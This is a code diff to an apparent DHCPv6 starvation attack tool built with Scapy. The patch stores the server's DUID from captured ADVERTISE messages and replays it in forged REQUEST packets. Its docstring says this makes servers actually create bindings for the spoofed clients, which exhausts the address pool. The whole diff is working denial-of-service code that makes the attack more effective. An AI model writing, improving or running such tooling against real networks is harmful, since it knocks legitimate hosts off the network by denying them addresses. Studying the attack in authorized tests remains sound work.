@@ -85,17 +85,31 @@ def build_solicit(mac: str, trid: int, iaid: int) -> Packet:
     )
 
 
-def build_request(mac: str, trid: int, iaid: int, server_mac: str, offered: str) -> Packet:
-    """REQUEST for the address an ADVERTISE offered, addressed to the advertising server."""
+def build_request(
+    mac: str,
+    trid: int,
+    iaid: int,
+    server_mac: str,
+    offered: str,
+    server_duid: Packet | None = None,
+) -> Packet:
+    """REQUEST for the address an ADVERTISE offered, addressed to the advertising server.
+
+    The Server Identifier is the server's DUID exactly as the ADVERTISE carried it. Servers
+    compare the whole DUID, including its time field, so a DUID rebuilt from the MAC alone
+    is ignored and no binding is created. Without server_duid, the DUID is rebuilt from the MAC.
+    """
     mac = normalize_unicast_mac(mac)
     server = normalize_unicast_mac(server_mac)
+    if server_duid is None:
+        server_duid = DUID_LLT(lladdr=server, timeval=0)
     return (
         Ether(src=mac, dst=ALL_DHCP_SERVERS_MAC)
         / IPv6(src=link_local_from_mac(mac), dst=ALL_DHCP_SERVERS_IP)
         / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
         / DHCP6_Request(trid=trid)
         / DHCP6OptClientId(duid=DUID_LLT(lladdr=mac, timeval=0))
-        / DHCP6OptServerId(duid=DUID_LLT(lladdr=server, timeval=0))
+        / DHCP6OptServerId(duid=server_duid.copy())
         / DHCP6OptIA_NA(iaid=iaid, T1=0, T2=0, ianaopts=[DHCP6OptIAAddress(addr=offered)])
     )
 
@@ -107,6 +121,7 @@ class Advertise:
     server_mac: str
     offered: str
     iaid: int
+    server_duid: Packet | None = None
 
 
 def parse_advertise(packet: Packet) -> Advertise | None:
@@ -122,6 +137,7 @@ def parse_advertise(packet: Packet) -> Advertise | None:
         server_mac=packet[DHCP6OptServerId].duid.lladdr,
         offered=ia.ianaopts[0].addr,
         iaid=ia.iaid,
+        server_duid=packet[DHCP6OptServerId].duid.copy(),
     )
 
 
@@ -165,7 +181,8 @@ def run_dhcpv6_starvation(
             snapshot = replace(stats)
         if config.request:
             send(build_request(advertise.client_mac, advertise.trid, advertise.iaid,
-                               advertise.server_mac, advertise.offered),
+                               advertise.server_mac, advertise.offered,
+                               server_duid=advertise.server_duid),
                  iface=config.iface, verbose=False)
         on_progress(snapshot)
 
